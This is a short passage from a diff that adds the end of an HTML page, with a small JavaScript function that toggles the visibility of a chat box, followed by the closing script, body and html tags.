+    /* ── CHAT ── */
+    function toggleChat() {
+      const box = document.getElementById('chat-box');
+      box.classList.toggle('open');
+    }
+  </script>
+
+</body>
+</html>
